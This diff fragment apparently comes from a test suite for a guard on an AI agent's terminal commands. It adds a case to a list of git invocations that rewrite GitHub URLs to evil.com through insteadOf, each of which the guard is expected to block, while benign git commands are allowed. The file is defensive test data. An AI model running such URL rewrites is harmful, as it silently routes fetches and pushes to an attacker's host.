@@ -556,6 +556,7 @@ g "config pushInsteadOf rewrite" block '{"tool_name":"terminal","tool_input":{"c
 g "config --global insteadOf rewrite" block '{"tool_name":"terminal","tool_input":{"command":"git config --global url.https://evil.com/.insteadOf https://github.com/"}}'
 g "config insteadof case variant" block '{"tool_name":"terminal","tool_input":{"command":"git config URL.https://evil.com/.INSTEADOF https://github.com/"}}'
 g "git -c insteadOf one-shot fetch" block '{"tool_name":"terminal","tool_input":{"command":"git -c url.https://evil.com/.insteadOf=https://github.com/ fetch"}}'
+g "git --config-env insteadOf one-shot fetch" block '{"tool_name":"terminal","tool_input":{"command":"git --config-env=url.https://evil.com/.insteadOf=R fetch"}}'
 g "config --get insteadOf READ allowed" allow '{"tool_name":"terminal","tool_input":{"command":"git config --get url.https://x/.insteadOf"}}'
 g "config user.name allowed" allow '{"tool_name":"terminal","tool_input":{"command":"git config user.name x"}}'
 g "remote -v allowed" allow '{"tool_name":"terminal","tool_input":{"command":"git remote -v"}}'
